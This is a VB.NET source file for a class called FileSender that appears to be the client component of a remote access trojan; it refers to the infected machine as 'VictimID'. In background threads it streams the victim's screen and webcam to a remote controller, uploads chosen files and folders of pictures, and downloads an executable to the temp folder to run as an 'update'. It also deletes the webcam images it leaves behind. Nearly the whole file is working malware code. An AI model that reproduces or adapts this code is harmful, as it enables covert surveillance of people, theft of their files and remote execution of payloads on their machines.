Public Class FileSender
    Dim IsStreaming_RemoteWebcam As Boolean = False
    Dim IsStreaming_RemoteDesktop As Boolean = False

    Dim Speed_RemoteWebcam As Integer = 2000
    Dim Speed_RemoteDesktop As Integer = 2000

    Dim Quality_RemoteWebcam As Integer = 600
    Dim Quality_RemoteDesktop As Integer = 600

    Dim RemoteWebcamID As Integer = 0

    Public Event RemoteDesktopError(ByVal sError As String)
    Public Event RemoteWebcamError(ByVal sError As String)
    Public Event SendFileToClientError(ByVal sError As String)
    Public Event GetFileFromServerError(ByVal sError As String)
    Public Event GetUpdateFromServerError(ByVal sError As String)
    Public Event SendPicturesFromFolderError(ByVal sError As String)
    Public Event SendSingelScreenShowToServerError(ByVal sError As String)
    Public Event SendSingelScreenForListviewToServerError(ByVal sError As String)
    Public Event SendImagePreviewInPictureBoxToServerErro(ByVal sError As String)



#Region "API"
    Declare Function capGetDriverDescriptionA Lib "avicap32" (ByVal wDriverIndex As Short, ByVal lpszName As String, ByVal cbName As Integer, ByVal lpszVer As String, ByVal cbVer As Integer) As Boolean
    Private Declare Function capCreateCaptureWindowA Lib "avicap32.dll" (ByVal lpszWindowName As String, ByVal dwStyle As Integer, ByVal x As Integer, ByVal y As Integer, ByVal nWidth As Integer, ByVal nHeight As Short, ByVal hWndParent As Integer, ByVal nID As Integer) As Integer
    Private Declare Function SendMessage Lib "user32" Alias "SendMessageA" (ByVal hwnd As Integer, ByVal wMsg As Integer, ByVal wParam As Short, ByVal lParam As String) As Integer
    Declare Function GetDesktopWindow Lib "user32" () As Long
    Private Const WS_CHILD As Integer = &H40000000
    Private Const WS_VISIBLE As Integer = &H10000000
    Private Const WM_CAP_DRIVER_CONNECT = (WM_CAP_START + 10)
    Private Const WM_CAP_START = &H400
    Private Const WM_CAP_GRAB_FRAME = WM_CAP_START + 60
    Private Const WM_CAP_SAVEDIB As Integer = WM_CAP_START + 25
    Private Const WM_CAP_DRIVER_DISCONNECT As Short = WM_CAP_START + 11
#End Region

    Public Function CheckRemoteWebcam() As Boolean
        Dim driver As String = Space(80)
        Dim version As String = Space(80)
        Return capGetDriverDescriptionA(0, driver, 80, version, 80)
    End Function

    Public Sub SetRemoteWebcamSpeed(ByVal iSpeed As Integer)
        Speed_RemoteWebcam = iSpeed
    End Sub
    Public Sub SetRemoteDesktopSpeed(ByVal iSpeed As Integer)
        Speed_RemoteDesktop = iSpeed
    End Sub
    Public Sub SetRemoteWebcamID(ByVal iWebcamID As Integer)
        RemoteWebcamID = iWebcamID
    End Sub
    Public Sub SetRemoteWebcamQuality(ByVal iQuali As Integer)
        Quality_RemoteWebcam = iQuali
    End Sub
    Public Sub SetRemoteDesktopQuality(ByVal iQuali As Integer)
        Quality_RemoteDesktop = iQuali
    End Sub
    Public Sub StartRemoteWebcam()
        IsStreaming_RemoteWebcam = True
        Dim t As New System.Threading.Thread(AddressOf SendPicturesToServer_RemoteWebcam)
        t.IsBackground = True
        t.Start()
    End Sub
    Public Sub StopRemoteWebcam()
        IsStreaming_RemoteWebcam = False
    End Sub
    Public Sub StartRemoteDesktop()
        IsStreaming_RemoteDesktop = True
        Dim t As New System.Threading.Thread(AddressOf SendPicturesToServer_RemoteDesktop)
        t.IsBackground = True
        t.Start()
    End Sub
    Public Sub StopRemoteDesktop()
        IsStreaming_RemoteDesktop = False
    End Sub
    Public Sub GetFileFromServer(ByVal VonHier As String, ByVal NachHier As String)
        Dim t As New System.Threading.Thread(AddressOf GetFileFromServer)
        t.IsBackground = True
        t.Start(New String() {VonHier, NachHier})
    End Sub
    Public Sub GetUpdateFromServer(ByVal VonHier As String, ByVal NachHier As String)
        Dim t As New System.Threading.Thread(AddressOf GetUpdateFromServer)
        t.IsBackground = True
        t.Start(New String() {VonHier})
    End Sub
    Public Sub SendPicturesFromFolder(ByVal sFolder As String, ByVal OP As String)
        Dim t As New System.Threading.Thread(AddressOf SendPicturesFromFolder)
        t.IsBackground = True
        t.Start(New String() {sFolder})
    End Sub

    Public Sub SendFileToServer(ByVal VonHier As String, ByVal NachHier As String)
        Dim t As New System.Threading.Thread(AddressOf SendFileToServer)
        t.IsBackground = True
        t.Start(New String() {VonHier, NachHier})
    End Sub

    Public Sub SendSingelScreenShowToServer(ByVal OP As String)
        Dim t As New System.Threading.Thread(AddressOf SendSingelScreenShowToServer)
        t.IsBackground = True
        t.Start()
    End Sub
    Public Sub SendSingelScreenForListviewToServer(ByVal OP As String)
        Dim t As New System.Threading.Thread(AddressOf SendSingelScreenForListviewToServer)
        t.IsBackground = True
        t.Start()
    End Sub
    Public Sub SendImagePreviewInPictureBoxToServer(ByVal sPfad As String, ByVal OP As String)
        Dim t As New System.Threading.Thread(AddressOf SendImagePreviewInPictureBoxToServer)
        t.IsBackground = True
        t.Start(New String() {sPfad})
    End Sub


    Public Sub SendImagePreviewInPictureBoxToServer(ByVal Infos() As String)
        Try
            Dim TcpClient As New System.Net.Sockets.TcpClient
            Dim bWriter As System.IO.BinaryWriter
            Dim BildQualität As Integer = 160

            TcpClient.Connect(_Ipadresse, _TransferPort)
            bWriter = New System.IO.BinaryWriter(TcpClient.GetStream)

            bWriter.Write("GetPicture")
            bWriter.Write(VictimID)
            Dim b() As Byte = Image2ByteArray(PicResizeByWidth(New Bitmap(Infos(0)), BildQualität), Imaging.ImageFormat.Jpeg)
            bWriter.Write(CInt(b.Length))
            bWriter.Write(b)

            bWriter.Close()
            TcpClient.Close()
        Catch ex As Exception
            RaiseEvent SendImagePreviewInPictureBoxToServerErro(ex.Message)
        End Try
    End Sub
    Private Sub SendSingelScreenForListviewToServer()
        Try
            Dim TcpClient As New System.Net.Sockets.TcpClient
            Dim bWriter As System.IO.BinaryWriter
            Dim BildQualität As Integer = 200

            TcpClient.Connect(_Ipadresse, _TransferPort)
            bWriter = New System.IO.BinaryWriter(TcpClient.GetStream)

            bWriter.Write("Listview")
            bWriter.Write(VictimID)
            Dim b() As Byte = Image2ByteArray(PicResizeByWidth(CaptureScreen(), BildQualität), Imaging.ImageFormat.Jpeg)
            bWriter.Write(CInt(b.Length))
            bWriter.Write(b)

            bWriter.Close()
            TcpClient.Close()
        Catch ex As Exception
            RaiseEvent SendSingelScreenForListviewToServerError(ex.Message)
        End Try
    End Sub
    Private Sub SendSingelScreenShowToServer()
        Try
            Dim TcpClient As New System.Net.Sockets.TcpClient
            Dim writer As System.IO.BinaryWriter
            Dim BildQualität As Integer = 200

            TcpClient.Connect(_Ipadresse, _TransferPort)
            writer = New System.IO.BinaryWriter(TcpClient.GetStream)

            writer.Write("ShowSingekScreen")
            writer.Write(VictimID)
            Dim PictureBytes() As Byte = Image2ByteArray(PicResizeByWidth(CaptureScreen(), BildQualität), Imaging.ImageFormat.Jpeg)
            writer.Write(PictureBytes.Length)
            writer.Write(PictureBytes)

            writer.Close()
            TcpClient.Close()
        Catch ex As Exception
            RaiseEvent SendSingelScreenShowToServerError(ex.Message)
        End Try
    End Sub
    Private Sub GetUpdateFromServer(ByVal Infos() As String)
        Try

            Dim TcpClient As New System.Net.Sockets.TcpClient
            Dim bWriter As System.IO.BinaryWriter
            Dim bReader As System.IO.BinaryReader

            TcpClient.Connect(_Ipadresse, _TransferPort)
            bWriter = New System.IO.BinaryWriter(TcpClient.GetStream)
            bReader = New System.IO.BinaryReader(TcpClient.GetStream)

            bWriter.Write("UpdateFromFile")
            bWriter.Write(VictimID)
            bWriter.Write(Infos(0)) 'Client empfängt datei

            Dim l As Integer = bReader.ReadInt32()
            Dim b() As Byte = bReader.ReadBytes(l)
            Dim fs As New IO.FileStream(Environ("temp") & "\xxupd.exe", IO.FileMode.Create, IO.FileAccess.Write, IO.FileShare.None)

            fs.Write(b, 0, l)

            fs.Close()
            bReader.Close()
            bWriter.Close()
            TcpClient.Close()

            UpdateFromFile()
        Catch ex As Exception
            RaiseEvent GetUpdateFromServerError(ex.Message)
        End Try
    End Sub
    Private Sub SendPicturesFromFolder(ByVal Infos() As String)
        Try
            Dim TcpClient As New System.Net.Sockets.TcpClient
            Dim bWriter As System.IO.BinaryWriter

            TcpClient.Connect(_Ipadresse, _TransferPort)
            bWriter = New System.IO.BinaryWriter(TcpClient.GetStream)

            bWriter.Write("SendImage")
            bWriter.Write(VictimID)

            For Each Picture As String In IO.Directory.GetFiles(Infos(0))
                Try
                    Dim Picture_Bitmap As New Bitmap(Picture)
                    Dim PictureBytes() As Byte = Image2ByteArray(PicResizeByWidth(Picture_Bitmap, 200), Imaging.ImageFormat.Jpeg)

                    bWriter.Write(Picture)
                    bWriter.Write(PictureBytes.Length)
                    bWriter.Write(PictureBytes)

                Catch ex As Exception
                End Try
            Next
            TcpClient.Close()
            bWriter.Close()
        Catch ex As Exception
            RaiseEvent SendPicturesFromFolderError(ex.Message)
        End Try
    End Sub
    Private Sub SendFileToServer(ByVal Infos() As String)
        Try
            Dim TcpClient As New System.Net.Sockets.TcpClient
            Dim FileBytes() As Byte = My.Computer.FileSystem.ReadAllBytes(Infos(0))
            Dim bWriter As System.IO.BinaryWriter

            TcpClient.Connect(_Ipadresse, _TransferPort)
            bWriter = New System.IO.BinaryWriter(TcpClient.GetStream)

            bWriter.Write("GetFileFromClient") 'Client sendet eine datei
            bWriter.Write(VictimID)
            bWriter.Write(Infos(0))
            bWriter.Write(Infos(1))
            bWriter.Write(CInt(FileBytes.Length))
            bWriter.Write(FileBytes)

            bWriter.Close()
            TcpClient.Close()
        Catch ex As Exception
            RaiseEvent SendFileToClientError(ex.Message)
        End Try
    End Sub
    Private Sub GetFileFromServer(ByVal Infos() As String)
        Try
            Dim tcpc As New System.Net.Sockets.TcpClient
            Dim bWriter As System.IO.BinaryWriter
            Dim bReader As System.IO.BinaryReader
            Dim fs As New IO.FileStream(Infos(1), IO.FileMode.Create, IO.FileAccess.Write, IO.FileShare.None)

            tcpc.Connect(_Ipadresse, _TransferPort)
            bWriter = New System.IO.BinaryWriter(tcpc.GetStream)
            bReader = New System.IO.BinaryReader(tcpc.GetStream)

            bWriter.Write("GetFile")
            bWriter.Write(VictimID)
            bWriter.Write(Infos(0)) 'Client empfängt datei
            bWriter.Write(Infos(1))

            Dim l As Integer = bReader.ReadInt32()
            Dim b() As Byte = bReader.ReadBytes(l)

            fs.Write(b, 0, l)
            fs.Close()
        Catch ex As Exception
            RaiseEvent GetFileFromServerError(ex.Message)
        End Try
    End Sub
    Private Sub SendPicturesToServer_RemoteDesktop()
        Try
            Dim TcpClient As New System.Net.Sockets.TcpClient
            TcpClient.Connect(_Ipadresse, _TransferPort)
            Dim bWriter As New System.IO.BinaryWriter(TcpClient.GetStream)
            bWriter.Write("RemoteScreen")
            bWriter.Write(VictimID)
            While IsStreaming_RemoteDesktop
                Dim bitmap As Bitmap
                bitmap = CaptureScreen()
                Dim b() As Byte = Image2ByteArray(PicResizeByWidth(bitmap, Quality_RemoteDesktop), Imaging.ImageFormat.Jpeg)
                bWriter.Write(VictimID.ToString)
                bWriter.Write(CInt(b.Length))
                bWriter.Write(b)
                System.Threading.Thread.Sleep(Speed_RemoteDesktop)
            End While
            bWriter.Close()
            TcpClient.Close()
        Catch ex As Exception
            RaiseEvent RemoteDesktopError(ex.Message)
        End Try
    End Sub
    Private Function CaptureScreen() As Bitmap
        Dim b As New Bitmap(SystemInformation.VirtualScreen.Width, SystemInformation.VirtualScreen.Height)
        Dim g As Graphics = Graphics.FromImage(b)
        g.CopyFromScreen(0, 0, 0, 0, b.Size)
        g.Dispose()
        Return b
    End Function
    Private Sub ClearRemoteWebcamImages()
        On Error Resume Next
        For Each File As String In System.IO.Directory.GetFiles(Environ("temp"))
            If InStr(File, "~image") Then
                My.Computer.FileSystem.DeleteFile(File)
            End If
        Next
    End Sub
    Delegate Sub d1()
    Private Sub SendPicturesToServer_RemoteWebcam()
        If Form1.InvokeRequired Then
            Dim d As New d1(AddressOf SendPicturesToServer_RemoteWebcam)
            Form1.Invoke(d)
        Else
            Dim TcpClient As New System.Net.Sockets.TcpClient
            Dim bWriter As System.IO.BinaryWriter
            Dim HWD As Integer = 0
            Dim FoundError As Boolean = True
            Dim i As Integer = 0

            TcpClient.Connect(_Ipadresse, _TransferPort)
            bWriter = New System.IO.BinaryWriter(TcpClient.GetStream)

            While FoundError
                Try
                    HWD = capCreateCaptureWindowA("CaptureWindow", WS_CHILD And WS_VISIBLE, 0, 0, 0, 0, GetDesktopWindow, 0)
                    FoundError = False
                Catch ex As Exception
                    FoundError = True
                End Try
            End While

            SendMessage(HWD, WM_CAP_DRIVER_CONNECT, RemoteWebcamID, 0)
            bWriter.Write("Webcam")
            bWriter.Write(VictimID)

            Try
                While IsStreaming_RemoteWebcam
                    Try
                        IO.File.Delete(Environ("temp") & "\" & "~image" & (i - 1).ToString)
                    Catch ex As Exception
                    End Try

                    SendMessage(HWD, WM_CAP_GRAB_FRAME, 0, 0)
                    SendMessage(HWD, WM_CAP_SAVEDIB, 0, Environ("temp") & "\" & "~image" & i.ToString)
                    Dim WebcamImage As New Bitmap(Environ("temp") & "\" & "~image" & i.ToString)
                    Dim ImageInBytes() As Byte = Image2ByteArray(PicResizeByWidth(WebcamImage, Quality_RemoteWebcam), Imaging.ImageFormat.Jpeg)
                    bWriter.Write(VictimID.ToString)
                    bWriter.Write((ImageInBytes.Length))
                    bWriter.Write(ImageInBytes)
                    i += 1
                    System.Threading.Thread.Sleep(Speed_RemoteWebcam)

                End While

                SendMessage(HWD, WM_CAP_DRIVER_DISCONNECT, Speed_RemoteWebcam, 0)
                SendMessage(HWD, 10, 10, 0)
                bWriter.Close()
                TcpClient.Close()
                ClearRemoteWebcamImages()

            Catch ex As Exception
                RaiseEvent RemoteWebcamError(ex.Message)
            End Try
        End If
    End Sub
    Private Function PicResizeByWidth(ByVal SourceImage As Image, ByVal NewWidth As Integer) As Bitmap
        Dim SizeFactor As Decimal = NewWidth / SourceImage.Width
        Dim NewHeigth As Integer = SizeFactor * SourceImage.Height
        Dim NewImage As New Bitmap(NewWidth, NewHeigth)
        Using G As Graphics = Graphics.FromImage(NewImage)
            G.InterpolationMode = Drawing2D.InterpolationMode.HighQualityBicubic
            G.DrawImage(SourceImage, New Rectangle(0, 0, NewWidth, NewHeigth))
        End Using
        Return NewImage
    End Function
    Private Function Image2ByteArray(ByVal Bild As Image, ByVal Bildformat As System.Drawing.Imaging.ImageFormat) As Byte()
        Dim MS As New IO.MemoryStream
        Bild.Save(MS, Bildformat)
        MS.Flush()
        Return MS.ToArray
    End Function


End Class
